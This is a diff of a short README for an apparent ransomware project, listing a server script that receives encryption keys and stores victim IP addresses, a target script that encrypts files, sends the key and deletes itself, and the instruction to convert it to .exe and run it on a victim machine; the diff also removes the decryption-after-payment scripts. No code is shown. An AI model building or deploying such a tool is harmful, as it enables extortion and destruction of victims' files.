@@ -1,11 +1,9 @@
 Ransomware
 	server-
-		server.py - listens for the target to run ransomware.py and recieves key 
-		sendkey.py - sends the key onces payment is verified
+		server.py - listens for the target to run ransomware.py and recieves key stores ip in a dataframe
 	target-
 		ransomware.py - encrypts files, sends key and deletes after
-		listen.py - listens for decrypt message from server and recieves key, then decrypts 
-
+		
 convert to .exe and run on victim machine
 
 serverside client for ransomware
